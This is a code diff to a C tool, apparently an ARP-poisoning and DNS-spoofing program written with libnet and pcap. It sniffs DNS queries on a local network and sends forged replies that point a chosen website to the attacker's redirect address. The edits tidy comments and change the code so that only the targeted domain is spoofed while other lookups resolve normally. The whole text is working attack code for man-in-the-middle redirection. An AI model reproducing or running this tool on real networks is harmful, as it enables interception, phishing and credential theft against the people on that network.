@@ -58,7 +58,7 @@ void check_prerequisites(int argc, char **argv)
  */
 void *start_arp_poisoning()
 {
-  int jam_all = 0; // TODO change this sa user will pass ip addres of victim or "all"
+  int jam_all = 0; // TODO change this so user will pass ip addres of victim or "all"
   libnet_t *ln;
   u_int32_t target_ip_addr, zero_ip_addr;
   u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
@@ -131,7 +131,8 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
   dns_header = (char *)(bytes + ETH_HLEN + LIBNET_IPV4_H + LIBNET_UDP_H);
   dns_query = (char *)(bytes + ETH_HLEN + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);
 
-  // Check if this packet was send by this program
+  // Check if this packet was send by this program and if so do not process it because it
+  // most likely was send by libnet_name2addr4() function.
   int was_sent_by_this_program = 1;
   for (int i = 0; i < 6; i++)
   {
@@ -145,7 +146,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
 
   int dns_query_len = strlen(dns_query);
 
-  // Extract domain name from dns query
+  // Extract domain name from dns_query, because it is packed and thus it cannot be used directly.
   char domain_name[128];
   char *dns_query_backup = dns_query;
   if (dn_expand((u_char *)dns_header, bytes + h->caplen, (unsigned char *)dns_query, domain_name, sizeof(domain_name)) < 0)
@@ -155,32 +156,15 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
   // "dn_expand" changes given pointer so we need to restore it
   dns_query = dns_query_backup;
 
+  // If dns request is for wanted site then replace it with our site.
   domain_name[dns_query_len - 1] = '\0';
-
   libnet_t *handler = NULL;
-  printf("DNS query: %s %s\n", domain_name, website_to_spoof);
-  u_long requested_ip_addr = libnet_name2addr4(handler, domain_name, LIBNET_RESOLVE);
-  printf("DNS query: %s %s\n", domain_name, website_to_spoof);
-  // u_long requested_ip_addr = redirect_ip_addr;
+  u_long requested_ip_addr = redirect_ip_addr;
   int domain_name_matches_website = (strncmp(website_to_spoof, domain_name, strlen(website_to_spoof) - 1) == 0);
   uint16_t dns_id = dns_header[0] << 8 | dns_header[1];
-
-  if (domain_name_matches_website)
+  if (!domain_name_matches_website)
   {
-    // printf("\n");
-    // printf("DNS query: %s %s\n", domain_name, website_to_spoof);
-    // printf("UDP packet length: %d\n", ntohs(udp_header->len));
-    // printf("UDP source port: %d\n", ntohs(udp_header->source));
-    // printf("UDP destination port: %d\n", ntohs(udp_header->dest));
-    // printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->saddr));
-    // printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
-    // printf("Protocol: %d\n", ip_header->protocol);
-    // printf("Requested IP: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
-    // print ethernet address
-
-    requested_ip_addr = redirect_ip_addr;
-    // printf("Changing to: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
-    // printf("DNS ID: %x\n", dns_id);
+    requested_ip_addr = libnet_name2addr4(handler, domain_name, LIBNET_RESOLVE);
   }
 
   char dns_response[1024];
@@ -193,8 +177,9 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
   int packet_size = dns_response_size + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H;
 
   handler = libnet_init(LIBNET_RAW4, interface_name, errbuf);
-  // Send fake dns response
   libnet_ptag_t dns_ptag = 0, udp_ptag = 0, ip_ptag = 0, eth_ptag = 0;
+
+  // Build all the layers from bottom to top
 
   libnet_build_dnsv4(
       LIBNET_UDP_DNSV4_H,
@@ -204,8 +189,8 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
       1,
       0,
       0,
-      (unsigned char *)dns_response, // insert payload
-      dns_response_size,             // 36	//insert length
+      (unsigned char *)dns_response,
+      dns_response_size,
       handler,
       dns_ptag);
 
@@ -214,13 +199,14 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
     printf("Building DNS header failed: %s\n", libnet_geterror(handler));
     exit(1);
   }
+
   libnet_build_udp(
       ntohs(udp_header->dest),
       ntohs(udp_header->source),
-      dns_response_size + LIBNET_DNS_H + LIBNET_UDP_H, // 36 + 12 + 8
-      0,                                               // insert UDP checksum. have to check later
-      NULL,                                            // insert payload
-      0,                                               // insert lenghth
+      dns_response_size + LIBNET_DNS_H + LIBNET_UDP_H,
+      0,
+      NULL,
+      0,
       handler,
       udp_ptag);
 
@@ -231,9 +217,9 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
   }
 
   libnet_build_ipv4(
-      packet_size, // 56 + 20
+      packet_size,
       0,
-      6888, // libnet_get_prand (LIBNET_PRu16)
+      6888,
       0,
       60,
       IPPROTO_UDP,
